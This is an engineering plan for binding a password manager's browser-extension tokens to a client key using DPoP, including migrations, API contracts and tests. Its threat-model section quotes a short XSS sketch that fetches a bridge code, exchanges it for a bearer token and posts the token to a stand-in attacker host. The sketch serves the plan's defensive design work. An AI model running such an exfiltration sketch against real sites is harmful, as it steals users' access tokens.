# Plan: Extension Token Sender-Constrained via DPoP

Status: **Phase 1 — LOCKED (Round 3 review absorbed)**
Branch: `feat/extension-dpop-sender-constrained` (created from `main`, post-#490 merge)
Related: PR #489 (P0 legacy-endpoint deprecation, merged), PR #490 (BRIDGE_CODE_LENGTH constant, merged)

## Round-by-round summary

**Round 1 → Round 2 changes** — three user scope decisions:
1. **S3 strict-from-day-one**: cnfJkt required; `ExtensionBridgeCode.cnfJkt` NOT NULL; `validateExtensionToken` always requires DPoP for BROWSER_EXTENSION. NO legacy bearer-only branch.
2. **F5/T6 Option A — metadata-only**: existing AUDIT_ACTION constants carry `metadata.dpopError` / `metadata.cnfJktFingerprint`; no new constants.
3. **T7 full Playwright extension loader** in this PR.

**Round 2 → Round 3 changes** — incorporate Round 2 expert findings:
- New contract **C12** for `POST /api/extension/key/reset` (Round 2 F3 / S11) with body-cnfJkt-must-match-proof invariant + atomicity spec.
- Migration also flips `extension_tokens.cnf_jkt` to NOT NULL for BROWSER_EXTENSION rows via partial unique index / CHECK constraint (Round 2 F2 — schema-enforced invariant).
- `canonicalHtuClient` algorithm pinned: `new URL(serverUrl).origin + route` (closes Round 2 S13 equivalence gap).
- `ValidatedExtensionToken` moved to leaf module `src/lib/auth/tokens/extension-token-types.ts` so the new DPoP helper imports only types (Round 2 F1 / S14 — cycle-free).
- DPoP error iteration source = `Object.values(DPOP_VERIFY_ERROR)` (Round 2 T15 — 15 codes, not 7).
- E2E uses `context.on('request', ...)` to capture SW fetches (Round 2 T19); per-test fresh `userDataDir` for isolation (Round 2 T18); IDB direct inspection in boot test (Round 2 T20).
- Session-storage hydrate clears state when `tokenCnfJkt` is missing (Round 2 F4 — upgrade scenario).
- Migration covered by populated-state integration test (Round 2 T17); legacy integration test rewritten (Round 2 S12).
- C5 uses Prisma's `ExtensionTokenClientKind` enum (Round 2 F5).
- C8 sign-failure retries once with fresh keypair (Round 2 F6 — avoids self-induced sign-out loop).
- C9a marked `"use client"` for SSR safety (Round 2 F7).
- Various Minor findings (S15, S16, S17, S18, S20, S21, S22, T21-T26) addressed inline or in Known Risks / Considerations.

**Round 3 review absorbed** — final fixes applied to lock:
- **S23-r3 [Major, blocker]**: `canonicalHtuClient` was dropping basePath. Algorithm now preserves `new URL(serverUrl).pathname` (trailing-slash stripped) so basePath-mounted deployments produce matching `htu`. Equivalence smoke test extended with basePath case.
- **F2-r3 [Minor]**: `ValidatedExtensionToken.cnfJkt` documented as non-nullable by construction (IOS_APP null-cnfJkt rows are pre-filtered at the IOS dispatch guard). Lets C12's `safeStringEqual` check be type-safe.
- **F1-r3 [Minor]**: C8 code sample rewritten with inner `sign()` helper so `proof: string` narrows cleanly without `!`.
- **Remaining Round 3 Minors** (F3-r3 route convention, F4-r3 migration comment, F5-r3 iOS error-variant note, S24-r3 audit overload, S25-r3 safeStringEqual import, S26-r3 cookieless 401 test, S27-r3 atomicity self-heal note): noted as Phase-2 implementation guidance; non-blocking for plan-lock.

---

## Project context

- **Type**: web app (Next.js 16 App Router) + browser extension (Chrome MV3, TypeScript bundled to JS)
- **Test infrastructure**: unit (`vitest`) + integration (real Postgres, `src/__tests__/db-integration/`) + E2E (Playwright, `e2e/`) + CI/CD (GitHub Actions, `scripts/pre-pr.sh`)
- **Test recommendation policy**: full test infrastructure exists; experts may raise Major/Critical findings about test gaps.

---

## Objective

Eliminate the "XSS-only bearer-token theft" attack on the browser-extension bridge flow by:

- **Goal A — bind bridge-code issuance to an extension-held key.** A code issued by `POST /api/extension/bridge-code` is exchangeable ONLY by a client that proves possession of the EC P-256 private key whose JWK thumbprint (`cnfJkt`) was registered at issuance.
- **Goal B — make BROWSER_EXTENSION access tokens sender-constrained.** Every API call presenting a BROWSER_EXTENSION token MUST include a valid RFC 9449 DPoP proof signed by the bound key. Tokens captured without the key cannot be used elsewhere. **No bearer-only fallback for BROWSER_EXTENSION rows.**

Both ship together as a single PR.

---

## Threat model — current vs. target

### Current (post-#489)

A successful same-origin XSS on the web app:

```
XSS:
  const r1 = await fetch("/api/extension/bridge-code", { method: "POST" });
  const { code } = await r1.json();                          // (1) bridge-code obtained
  const r2 = await fetch("/api/extension/token/exchange", {
    method: "POST", headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ code }),
  });
  const { token } = await r2.json();                         // (2) bearer obtained
  fetch("https://attacker.example/x", { method: "POST", body: token }); // (3) exfil
```

XSS does NOT need to intercept `postMessage`; the bearer at `(3)` is reusable from any client. Step-up gate (`requireRecentCurrentAuthMethod`) is permissive within ~15 min of fresh login.

### Target (post-this-plan, strict)

`(1)` rejects requests without `cnfJkt` (400). XSS CAN supply its own page-context jkt to issue a bridge-code, but:

- The bearer returned at `(2)` carries `cnfJkt = <XSS key thumbprint>`.
- The bearer is **sender-constrained**: every subsequent API call requires a DPoP proof signed by the bound key.
- At step `(3)`, the bearer alone is useless on `attacker.example` — the attacker would need to also exfiltrate the private key. The *legitimate* extension key is generated with `extractable: false` in the SW context and lives in an extension-origin IndexedDB; web-app-origin XSS cannot touch it.
- An XSS-generated page-context key IS held in the XSS's JS heap, so XSS can sign DPoP proofs WHILE THE PAGE IS ALIVE; cannot exfil the bearer for offline replay (the private key won't survive page unload in any practical attacker C2 scenario without separate persistent JS-storage gymnastics).

**Net improvement (revised vs. Round 1)**:

| Attack vector | Pre-this-plan | Post-this-plan |
|---|---|---|
| XSS → bearer exfil to C2, replay later | works | bearer alone non-replayable; key must also exfil and reuse — practically infeasible for ephemeral page-context keys |
| XSS → use bearer within page session | works | works (same threat surface as plain XSS; DPoP cannot help here) |
| Captured bearer at network MITM (post-TLS) | works | non-replayable from a different key holder; same-payload-capture attacker can replay within ~30s iat window before jti cache catches duplicate jti |
| Extension content-script bearer theft (compromised extension) | works | works (extension *is* the key holder; out of scope) |

**Not in scope**: defending against XSS that lives long enough in the page to make API calls itself.

---

## Requirements

### Functional

- FR1: `POST /api/extension/bridge-code` REQUIRES `cnfJkt` in JSON body (RFC 7638 thumbprint, 43 base64url chars). Missing or malformed → 400.
- FR2: `POST /api/extension/token/exchange` REQUIRES a DPoP header bound to the route's canonical URL. The proof's JWK thumbprint MUST equal `consumed.cnfJkt`. No `ath` at this step.
- FR3: `issueExtensionToken` REQUIRES `cnfJkt` parameter. Always persists on the new row.
- FR4: `validateExtensionToken` dispatch:
  - `clientKind === IOS_APP` → unchanged iOS branch (defers to extracted `validateExtensionTokenDpop` shared helper).
  - `clientKind === BROWSER_EXTENSION` → DPoP required on every call. DPoP failures map to `EXTENSION_TOKEN_DPOP_INVALID` (matches existing iOS error code).
- FR5: `POST /api/extension/token/refresh` REQUIRES DPoP (per FR4 BROWSER_EXTENSION path applies). The new rotated row carries `cnfJkt` forward from the validated old row.
- FR6: Extension background SW manages a non-extractable EC P-256 key pair in IndexedDB. Created lazily on first request, persisted across SW restarts. Single key reused for thumbprint + signing.
- FR7: Content script forwards `REQUEST_EXT_JKT` postMessage from web app to background; receives `{jkt}`; posts `EXT_JKT_READY` back with the originating `reqId`.
- FR8: Web app's `AutoExtensionConnect` performs two-stage handshake — stage 1 wait-for-jkt (≤500 ms), stage 2 bridge-code issuance with cnfJkt, stage 3 forward code via existing PASSWD_SSO_BRIDGE_CODE. **On stage-1 timeout, the connect fails with a clear "extension required / please reinstall" message** (no legacy fallback per S3 decision).
- FR9: Content script's exchange call attaches `DPoP: <proof>` header from background.
- FR10: Background SW's `swFetch` (and helpers wrapped by it) attaches DPoP proof on every authenticated API call. All bearer-using fetches in `extension/src/background/index.ts` MUST route through `swFetch` or a shared `swFetchAuthenticated` helper that does the same.
- FR11: CORS preflight responses for routes called from `chrome-extension://` origin advertise `DPoP` in `Access-Control-Allow-Headers`.
- FR12: Manual "Reset connection" action in the extension Options page calls `POST /api/extension/key/reset` (per C12) BEFORE deleting the IDB key record. Server response must be 2xx before the extension deletes its IDB row; on non-2xx the extension keeps the key and surfaces an error.

### Non-functional

- NFR1: warm-path DPoP overhead ≤ 5 ms p99 (cached CryptoKey, sign + header construction).
- NFR2: cold-path DPoP overhead ≤ 50 ms p99 (first request after SW restart — includes IDB read).
- NFR3: no plaintext private-key material in extension storage. CryptoKey stored in IndexedDB with `extractable: false`.
- NFR4: schema additive change. `ExtensionBridgeCode.cnf_jkt` added as **NOT NULL**. Since this column does not exist today, no backfill required — existing rows (if any in dev DB) are wiped by the same migration (table is short-lived 60s TTL records; users get a fresh code on next connect attempt).
- NFR5: release notes call out: "Existing extension users must update to v0.X.Y (this PR) to reconnect after deploy. Previously-installed extensions cannot complete the new handshake."
- NFR6: DPoP jti cache memory: at steady state, holds ~`active_dpop_calls_per_minute` keys (60s TTL). Operators with >100k actively-fetching extensions should size Redis accordingly. Per-key footprint ~80 bytes (jkt prefix + jti + epoch). Monitoring: Redis `INFO memory` + alerting on key-count growth.

---

## Technical approach

### Key reuse decision matrix

| Concern | iOS reference | Extension (this plan) | Notes |
|---|---|---|---|
| `verifyDpopProof`, `htu-canonical`, `jti-cache` | live | **reuse as-is** | RFC 9449 verification is identical |
| `clientKind` enum | `BROWSER_EXTENSION` / `IOS_APP` | unchanged enum, semantics tightened | BROWSER_EXTENSION rows are now ALWAYS cnfJkt-bound |
| `cnfJkt` column on `ExtensionToken` | already present (iOS-only) | **reuse, but now also populated for BROWSER_EXTENSION rows** | Single column, two writers |
| `cnfJkt` column on `ExtensionBridgeCode` | N/A (iOS uses `MobileBridgeCode.deviceJkt`) | **add NEW NOT NULL column** | Distinct table, no schema convergence with iOS |
| `htu` canonicalization | server-side `canonicalHtu` | **extract to shared helper** `canonicalHtuClient(serverUrl, route)` — same module, used by both server and extension. **Algorithm**: `const url = new URL(serverUrl); const basePath = url.pathname.replace(/\/$/, ""); return url.origin + basePath + route;`. `URL.origin` per WHATWG spec lowercases scheme/host AND strips default port (`:80`, `:443`); basePath is preserved (trailing slash stripped) so basePath-mounted deployments (e.g. `APP_URL=https://example.com/passwd-sso`) produce a matching `htu` on both sides. Closes case + port + basePath + trailing-slash equivalence vectors structurally. | Closes drift risk (S4 / S13 / Round-3 S23-r3) |
| jti cache | live, shared across all DPoP-using callers | **reuse** | per-jkt scoping isolates keyspaces |
| Nonce policy | `expectedNonce: null` (no challenge) | **mirror: null** | iOS analysis applies |
| Validation error code | `EXTENSION_TOKEN_DPOP_INVALID` | **reuse** | Existing union member |

### Key storage on the extension side (Manifest V3)

- **Location**: IndexedDB in the background service worker. CryptoKey objects round-trip through structured clone preserving `extractable: false`.
- **Why not `chrome.storage.local`**: CryptoKey support is non-uniform across Chrome versions. IDB is the well-defined home.
- **Generation**: `crypto.subtle.generateKey({ name: "ECDSA", namedCurve: "P-256" }, /* extractable */ false, ["sign"])`. The corresponding public key IS extractable (this is fine — it's published as a thumbprint anyway).
- **Persistence**: DB name `psso-ext`, store `dpop-keys`, key `current`. IDB schema versioned via `version`.
- **Lifecycle**:
  - First request → generate + persist.
  - SW restart → re-open IDB → retrieve existing CryptoKey.
  - Manual reset ("Reset connection" on Options page) → delete IDB record + server-side revoke of cnfJkt-bound tokens with the discarded thumbprint (per FR12).
  - Token family revoke (server-side) does NOT auto-rotate the key. Same key may be reused for the next connect.
  - Extension uninstall → Chrome wipes IDB along with the extension.
- **Concurrency**: background SW is single-threaded. The "first request" race is closed by an in-process Promise singleton that all callers `await`. Tested explicitly with `Promise.all([…, …])` (per T12).

### postMessage handshake

```
Web app → Content script:
  { type: "PASSWD_SSO_EXT_JKT_REQUEST", reqId: <uuid> }
Content script → background:
  { type: "GET_DPOP_JKT" }
Background → Content script (response):
  { jkt: "<43-char base64url>" }
Content script → Web app:
  { type: "PASSWD_SSO_EXT_JKT_READY", reqId: <uuid>, jkt: "<...>" }

[existing] Web app → Content script:
  { type: "PASSWD_SSO_BRIDGE_CODE", code, expiresAt }
Content script → background:
  { type: "GET_DPOP_PROOF", route: "/api/extension/token/exchange", method: "POST" }
Background → Content script:
  { dpop: "<JWS compact serialization>" }
Content script → Server:
  POST /api/extension/token/exchange
  DPoP: <proof>
  body: { code }
```

`reqId` defends against XSS injecting a `PASSWD_SSO_EXT_JKT_READY` BEFORE the legitimate content script responds. **Caveat**: this does NOT defend against XSS that races faster than the extension (XSS owns the page and can intercept any message). The compensating control is the *strict* mode: even if XSS substitutes its own jkt, the token it obtains is bound to a key XSS controls — not exfiltratable for offline replay.

### Server changes

**Migration** (`prisma/migrations/<timestamp>_extension_dpop_sender_constrained/migration.sql`):
```sql
-- Step 1: TRUNCATE in-flight bridge codes (60s TTL; data loss negligible).
-- TRUNCATE writes a single WAL record (faster than DELETE). This repo does NOT
-- use logical replication, so the publication-truncate-flag caveat does not apply.
TRUNCATE TABLE extension_bridge_codes;

-- Step 2: Delete legacy BROWSER_EXTENSION ExtensionToken rows (cnfJkt-null).
-- IOS_APP rows are spared regardless of cnfJkt (some pre-iOS-DPoP rows may have null).
DELETE FROM extension_tokens
  WHERE client_kind = 'BROWSER_EXTENSION' AND cnf_jkt IS NULL;

-- Step 3: Add NOT NULL column to extension_bridge_codes.
ALTER TABLE extension_bridge_codes
  ADD COLUMN cnf_jkt VARCHAR(64) NOT NULL;

-- Step 4: Enforce schema-level invariant on extension_tokens for BROWSER_EXTENSION rows.
-- Cannot use a column-level NOT NULL (IOS_APP historically may have nulls).
-- CHECK constraint is partial: BROWSER_EXTENSION → cnf_jkt MUST be non-null.
ALTER TABLE extension_tokens
  ADD CONSTRAINT extension_tokens_cnf_jkt_required_for_browser_ext
  CHECK (client_kind <> 'BROWSER_EXTENSION' OR cnf_jkt IS NOT NULL);

-- No index on cnf_jkt: query path uses token_hash / code_hash unique indexes;
-- cnf_jkt is read after that hit, never queried independently.
```

**Pre-deploy verification** (manual, per Round 2 F2):
```sql
-- Run on the production replica BEFORE deploying the migration to confirm
-- no IOS_APP rows would be retained-but-invalid by step 4's constraint shape
-- (constraint allows IOS_APP rows with null cnfJkt because their absence is
-- a pre-existing data state, not an invariant we want to retroactively enforce).
SELECT COUNT(*) FROM extension_tokens
  WHERE client_kind = 'IOS_APP' AND cnf_jkt IS NULL;
-- Expected: any value; documented for awareness. If non-zero, those rows
-- continue to be rejected at validateExtensionTokenDpop (mobile-token.ts:247-251
-- "defensive: IOS_APP row without cnfJkt cannot be DPoP-validated → invalid").
```

**Schema** (`prisma/schema.prisma`):
```prisma
model ExtensionBridgeCode {
  // ... existing fields unchanged ...
  /// RFC 7638 JWK thumbprint of the extension's DPoP key (base64url).
  /// Required — every bridge-code is bound to a thumbprint.
  cnfJkt    String   @map("cnf_jkt") @db.VarChar(64)
}
```

**Route changes**:
- `POST /api/extension/bridge-code`: Zod body schema becomes strict + required cnfJkt. `requireRecentCurrentAuthMethod(req)` gate UNCHANGED (per S5).
- `POST /api/extension/token/exchange`: after CAS-consume + findUnique, ALWAYS require DPoP proof bound to the route. On failure return `unauthorized()` (timing-uniform). Pass `cnfJkt` to `issueExtensionToken`. Response shape extended with `cnfJkt` (per C3b).
- `POST /api/extension/token/refresh`: validate old token (which now requires DPoP via `validateExtensionToken`'s BROWSER_EXTENSION branch). Pass `cnfJkt` from validated row to the new row create (per C10). Response shape extended with `cnfJkt` (per C3b).
- `issueExtensionToken`: REQUIRES `cnfJkt` parameter. Persists on row.
- `validateExtensionToken`: dispatches to the new `validateExtensionTokenDpop` shared helper for both IOS_APP and BROWSER_EXTENSION. Helper extracted from the existing IOS_APP block (with clientKind-aware lastUsedIp/UA branching).
- New shared helper file: `src/lib/auth/dpop/htu-canonical.ts` exports an additional pure function `canonicalHtuClient(serverUrl: string, route: string): string` that returns `${new URL(serverUrl).origin}${new URL(serverUrl).pathname.replace(/\/$/, "")}${route}` (per the canonicalization-decision-matrix entry above — basePath preserved for parity with server-side `canonicalHtu`). Server uses `canonicalHtu`; extension imports `canonicalHtuClient` from the same module via its build chain.
- New type module: `src/lib/auth/tokens/extension-token-types.ts` — exports `ValidatedExtensionToken` and the existing `TokenValidationError` / `TokenValidationResult` types. Both `extension-token.ts` and the new `dpop/validate-token-dpop.ts` import from this leaf module. This eliminates the otherwise-cyclic `dpop/validate-token-dpop.ts → extension-token.ts → dpop/validate-token-dpop.ts` graph (per Round 2 F1 / S14).
- New endpoint: `POST /api/extension/key/reset` per C12 below.
- `corsHeaders` in `src/lib/http/cors.ts`: add `DPoP` to `Access-Control-Allow-Headers` (per C11).
- `src/lib/proxy/cors-gate.ts`: add `API_PATH.EXTENSION_KEY_RESET` to `EXTENSION_TOKEN_ROUTES` so the new endpoint bypasses the proxy session-required gate (it authenticates via Bearer + DPoP, no session cookie) per Round 2 S21. Concurrently, add `EXTENSION_KEY_RESET: '/api/extension/key/reset'` to `API_PATH` in `src/lib/constants/integrations/extension.ts`.

### Extension content/background script changes

- `extension/src/lib/dpop-key.ts` — NEW. Owns IDB-backed key lifecycle (`getOrGenerateKey`, `getThumbprint`, `signProof`) and uses the shared `canonicalHtuClient` for `htu` construction.
- `extension/src/background/index.ts`:
  - `chrome.runtime.onMessage` handles `GET_DPOP_JKT` and `GET_DPOP_PROOF`.
  - **All three bearer-using fetches** (`swFetch`, `attemptTokenRefresh`, `revokeCurrentTokenOnServer`) attach DPoP via a shared `swFetchAuthenticated()` helper (per F2 / C8). `swFetch` becomes a thin wrapper over `swFetchAuthenticated`.
  - `tokenCnfJkt` is no longer needed as a runtime flag (DPoP is always required for BROWSER_EXTENSION tokens). The helper just always attaches when the user has a token.
- `extension/src/lib/session-storage.ts` — extend persisted state: add `tokenCnfJkt: string` (required, not optional). Read on hydrate, write on `SET_TOKEN`. `loadSession()` MUST return `null` when `raw.tokenCnfJkt` is not a 43-char base64url string — this covers the **upgrade-from-pre-PR scenario** (per Round 2 F4): users with a pre-PR persisted state will have `tokenCnfJkt === undefined`; hydrate returns null → user retriggers connect cleanly. After hydrate succeeds with a string `tokenCnfJkt`, the SW verifies `tokenCnfJkt === await getDpopThumbprint()`; mismatch → `clearSession()` (the key was reset mid-session; the token is no longer signable).
- `extension/src/content/token-bridge.js` AND `extension/src/content/token-bridge-lib.ts` — handle new `PASSWD_SSO_EXT_JKT_REQUEST` message; on receipt call background for jkt, post back `PASSWD_SSO_EXT_JKT_READY`. Bridge-code handler additionally calls background for a DPoP proof and attaches as header.
- `extension/src/lib/constants.ts` AND `src/lib/constants/integrations/extension.ts` — add `EXT_JKT_REQUEST_MSG_TYPE`, `EXT_JKT_READY_MSG_TYPE`. Sync test `src/__tests__/i18n/extension-constants-sync.test.ts` extended to assert equality of these two new constants (per F9).
- `extension/src/options/App.tsx` — add `validateServerUrl` strict-mode (rejects trailing slash, double slashes, lowercases scheme/host, strips default port). Existing field gains additional validation; UI shows the canonical form back to the user on save.

### Web app changes

- `src/components/extension/auto-extension-connect.tsx::connect()` — stage 1 calls new helper `requestExtensionJkt({ timeoutMs: 500 })`; on null result (extension absent / old extension), show "extension required" error message (per FR8 strict mode).
- `src/lib/extension-jkt-request.ts` — NEW (per C9a). **First line is `"use client";`** so Next.js Turbopack treats it as a client-only module — module top-level does NOT access `window`/`crypto`; all browser-globals are accessed inside the function body (per Round 2 F7). Exports `requestExtensionJkt`. Generates UUID reqId, posts `PASSWD_SSO_EXT_JKT_REQUEST`, registers temporary message listener filtered on `(event.source === window && event.origin === window.location.origin && event.data.type === EXT_JKT_READY_MSG_TYPE && event.data.reqId === issuedReqId)`. Resolves to the first matching jkt; on 500 ms timeout removes listener and resolves null. Honors only ONE response per reqId.
- `src/lib/inject-extension-bridge-code.ts` — unchanged.

### i18n / UX

- New error messages added to `messages/en/Extension.json` and `messages/ja/Extension.json`:
  - `extensionRequired` (en: "This connect requires the latest passwd-sso extension. Please install or update from the Chrome Web Store and try again." / ja: "この接続には最新版の passwd-sso 拡張機能が必要です。Chrome ウェブストアからインストール／更新後に再度お試しください。")
  - `extensionRequiredAction` (en: "Open Chrome Web Store" / ja: "Chrome ウェブストアを開く")
  - **No** "deprecated/廃止/利用できなくなった" wording per pre-1.0 guidance — phrase as "requires latest version / 最新版が必要です."
- `AutoExtensionConnect` failure UI gains a new branch for "extension required" (separate from existing `requiresReauth` / `requiresRecentSession`).

---

## Contracts

### C1 — `ExtensionBridgeCode.cnfJkt` column (NOT NULL)

- **Subject**: schema additive change to `extension_bridge_codes`.
- **Signature**: `cnfJkt: string` (NOT NULL VARCHAR(64), matches `ExtensionToken.cnfJkt` sizing).
- **Invariants**:
  - Value matches `/^[A-Za-z0-9_-]{43}$/` (RFC 7638 P-256 thumbprint). Validated at write site (Zod schema).
  - Once set on a row, never mutated (only `used_at` flips).
  - Migration TRUNCATEs in-flight rows (60s TTL — data loss negligible) so the NOT NULL constraint can be added in one statement without a separate backfill.
- **Forbidden patterns**:
  - `pattern: cnfJkt    String\?  @map\("cnf_jkt"\)` in schema.prisma — reason: this column is NOT NULL, not nullable.
  - `pattern: CREATE INDEX .* extension_bridge_codes .* cnf_jkt` — reason: no query path filters on it; would index a low-cardinality high-cost column with no consumer.
- **Acceptance**:
  - `prisma generate` produces `ExtensionBridgeCode.cnfJkt: string` (non-nullable).
  - `psql \d extension_bridge_codes` shows `cnf_jkt | character varying(64) | not null`.
  - Integration test: inserting a row without cnfJkt throws at the DB layer.

### C2 — `POST /api/extension/bridge-code` request body

- **Subject**: extend issuance request to carry the extension's DPoP thumbprint (required).
- **Signature**:
  ```ts
  const BridgeCodeIssueSchema = z
    .object({
      cnfJkt: z.string().regex(/^[A-Za-z0-9_-]{43}$/),
    })
    .strict();
  ```
- **Invariants**:
  - `cnfJkt` is required. Missing field → 400 invalid_request.
  - Body strict mode rejects unknown fields.
  - `requireRecentCurrentAuthMethod(req)` step-up gate UNCHANGED (per S5).
  - Server does NOT validate that the supplied jkt belongs to the calling client at this step; binding is enforced at exchange time via DPoP verification.
- **Forbidden patterns**:
  - `pattern: \.passthrough\(\)` on `BridgeCodeIssueSchema` — reason: strict mode is required.
  - `pattern: z\.string\(\)\.regex\(.\^\[A-Za-z0-9_-\]\{43\}.\)\.optional\(\)` — reason: cnfJkt is required, not optional.
  - `pattern: //.*requireRecentCurrentAuthMethod.*remove|removed|deprecated` and any deletion of the `requireRecentCurrentAuthMethod(req)` call in the route — reason: step-up gate bounds the XSS issuance window; cnfJkt is orthogonal defense.
- **Acceptance**:
  - With `{cnfJkt: "<43 char b64url>"}` → row created with that value, 201.
  - With empty body → 400.
  - With `{cnfJkt: "invalid"}` → 400.
  - With `{cnfJkt: valid, unknown: "x"}` → 400 (per T11, proves `.strict()` is active).
  - Rate limit + step-up + audit behavior unchanged.

### C3 — `POST /api/extension/token/exchange` DPoP enforcement

- **Subject**: exchange always requires DPoP.
- **Signature**:
  ```ts
  // Server, after CAS-consume + findUnique returns `consumed`:
  const dpopHeader = req.headers.get("dpop");
  const proof = await verifyDpopProof(dpopHeader, {
    expectedHtm: "POST",
    expectedHtu: canonicalHtu({ route: "/api/extension/token/exchange" }),
    expectedCnfJkt: consumed.cnfJkt,
    expectedNonce: null,
    jtiCache: getJtiCache(),
  });
  if (!proof.ok) {
    // Log dpopError via pino + audit metadata; return uniform 401.
    return unauthorized();
  }
  ```
- **Invariants**:
  - DPoP is always required (no `if (consumed.cnfJkt)` branch — cnfJkt is NOT NULL).
  - DPoP rejection returns the SAME `unauthorized()` as code-unknown/expired (timing-uniform; closes a validity oracle).
  - On success, `cnfJkt` is passed to `issueExtensionToken`.
  - No `ath` claim required (no access token yet).
  - Audit emission on success carries `metadata.cnfJktFingerprint` (first 16 hex of SHA-256(cnfJkt), matching iOS forensics pattern in mobile-token.ts:497-499).
  - Audit emission on failure carries `metadata.dpopError: string` (the verifier's error code, e.g., `"DPOP_SIG_INVALID"`).
- **Forbidden patterns**:
  - `pattern: expectedAth:` inside the exchange route — reason: no access token at this step.
  - `pattern: errorResponse\(API_ERROR\.DPOP_` in the exchange route — reason: error must be uniform with `unauthorized()`, not granular DPoP errors.
  - `pattern: if \(consumed\.cnfJkt\)` in the exchange route — reason: cnfJkt is now NOT NULL; the branch is dead and its presence signals lingering legacy thinking.
- **Acceptance**:
  - Valid DPoP → 201 with token issued.
  - Missing DPoP header → 401.
  - DPoP signed by wrong key → 401.
  - All failure paths produce `metadata.dpopError` audit entries (test asserts metadata).

### C3b — Exchange + refresh response shape carries `cnfJkt`

- **Subject**: response wire shape gains `cnfJkt` so the extension can persist + later validate the binding.
- **Signature**:
  ```ts
  // Both /api/extension/token/exchange and /api/extension/token/refresh:
  return NextResponse.json({
    token: issued.token,
    expiresAt: issued.expiresAt.toISOString(),
    scope: <…>,
    cnfJkt: issued.cnfJkt,  // NEW — always present
  });
  ```
- **Invariants**:
  - `cnfJkt` is always present in the response (matches the NOT NULL invariant on the row).
  - Value equals the cnfJkt the client supplied at bridge-code issuance.
  - Extension's `SET_TOKEN` message carries `cnfJkt`; `session-storage.ts` persists it.
  - On hydrate, the extension MUST verify `state.tokenCnfJkt === await getDpopThumbprint()`; mismatch implies the extension's key was rotated mid-session (e.g., user reset) and the token cannot be used — clear it.

  *Consumer walkthrough*: response is consumed by extension's `handleBridgeCodeMessage` (content script) which forwards `{ token, expiresAt, cnfJkt }` via `SET_TOKEN`. The background SW's `SET_TOKEN` handler stores all three in memory + IDB-backed session storage. `swFetchAuthenticated` reads no per-call binding (just attaches a proof signed by the current key); the persisted `tokenCnfJkt` is consumed only by the post-hydrate sanity check above. Web app consumers (`auto-extension-connect.tsx`) consume only `token`/`expiresAt`/`scope` (existing behavior); the new `cnfJkt` field is structurally ignored by web-app code.
- **Forbidden patterns**:
  - `pattern: cnfJkt\?:\s*string` in the response Zod schema — reason: cnfJkt is required.

### C4 — `issueExtensionToken` parameter extension

- **Subject**: helper REQUIRES cnfJkt; persists on row.
- **Signature**:
  ```ts
  export async function issueExtensionToken(params: {
    userId: string;
    tenantId: string;
    scope: string;
    cnfJkt: string;          // REQUIRED — persisted on the row.
  }): Promise<{ token: string; expiresAt: Date; scopeCsv: string; cnfJkt: string }>;
  ```
- **Invariants**:
  - cnfJkt is required.
  - Return shape includes cnfJkt for C3b.
  - `clientKind` continues to be omitted from the create payload; the Prisma `@default(BROWSER_EXTENSION)` applies (per F8 — explicit acknowledgement).
  - All other behavior unchanged.
- **Forbidden patterns**:
  - `pattern: clientKind: "IOS_APP"` inside `issueExtensionToken` body — reason: helper is for BROWSER_EXTENSION rows.
  - `pattern: cnfJkt\?:\s*string` in the parameter type — reason: required, not optional.
- **Acceptance**:
  - Call with `cnfJkt: "<valid>"` → row has cnfJkt populated AND clientKind defaults to BROWSER_EXTENSION.
  - Call without cnfJkt → TypeScript compile error (acceptance is enforced by type system, not runtime).

### C5 — `validateExtensionTokenDpop` shared helper + `validateExtensionToken` dispatch

- **Subject**: extract DPoP-validation body into a shared helper used by both IOS_APP and BROWSER_EXTENSION branches; eliminate the legacy bearer-only path for BROWSER_EXTENSION.
- **Signature**:
  ```ts
  // NEW file: src/lib/auth/dpop/validate-token-dpop.ts
  // The helper imports ONLY types from extension-token-types.ts (leaf module),
  // never values from extension-token.ts or mobile-token.ts — closes the cycle.
  import type { ValidatedExtensionToken } from "@/lib/auth/tokens/extension-token-types";
  import type { ExtensionTokenClientKind } from "@prisma/client";  // Prisma enum
  import type { DpopVerifyError } from "@/lib/auth/dpop/verify";

  export interface ValidateTokenDpopRow {
    id: string;
    userId: string;
    tenantId: string;
    cnfJkt: string;  // For BROWSER_EXTENSION: enforced NOT NULL by partial CHECK.
                     // For IOS_APP: caller (the IOS_APP dispatch) guards row.cnfJkt
                     // non-null at the call site (mobile-token.ts:247-251 pattern).
    scope: string;
    expiresAt: Date;
    familyId: string;
    familyCreatedAt: Date;
    clientKind: ExtensionTokenClientKind;  // Prisma-generated enum, NOT a hand-rolled union (Round 2 F5)
  }
  export type ValidateTokenDpopResult =
    | { ok: true; data: ValidatedExtensionToken }
    | { ok: false; error: "EXTENSION_TOKEN_INVALID" | "EXTENSION_TOKEN_DPOP_INVALID"; dpopError?: DpopVerifyError };
  export async function validateExtensionTokenDpop(args: {
    req: NextRequest;
    row: ValidateTokenDpopRow;
    accessToken: string;
  }): Promise<ValidateTokenDpopResult>;
  ```
- **Invariants**:
  - Helper uses `verifyDpopProof` with `expectedAth = computeAth(accessToken)`, `expectedCnfJkt = row.cnfJkt`, `expectedNonce = null`.
  - DPoP failures return `EXTENSION_TOKEN_DPOP_INVALID` (matches existing iOS error code at mobile-token.ts:229) with `dpopError` preserved.
  - On success, the helper updates `lastUsedAt` for ALL rows; updates `lastUsedIp` / `lastUsedUserAgent` ONLY for `IOS_APP` rows (preserves existing iOS behavior; BROWSER_EXTENSION rows historically left those fields NULL).
  - **Type-only import** from `extension-token-types.ts` (per Round 2 F1 / S14): `import type { ValidatedExtensionToken } from "@/lib/auth/tokens/extension-token-types"`. NO value imports from `extension-token.ts` or `mobile-token.ts`. The new leaf type module `src/lib/auth/tokens/extension-token-types.ts` is imported by both `extension-token.ts` (re-exports `ValidatedExtensionToken` for source-compat) AND the helper — cycle-free.
  - `validateExtensionToken` (BROWSER_EXTENSION branch): after the revoke/expiry gates, ALWAYS dispatch to `validateExtensionTokenDpop`. No `if (token.cnfJkt)` branch (column is NOT NULL).
  - `validateIosTokenDpop` in mobile-token.ts becomes a re-export: `export { validateExtensionTokenDpop as validateIosTokenDpop } from "@/lib/auth/dpop/validate-token-dpop"` — keeps iOS callers source-compatible without re-implementing.
  - The error code surfaced through `validateExtensionToken` is the new union `"EXTENSION_TOKEN_INVALID" | "EXTENSION_TOKEN_DPOP_INVALID"` — `TokenValidationError` type updated.
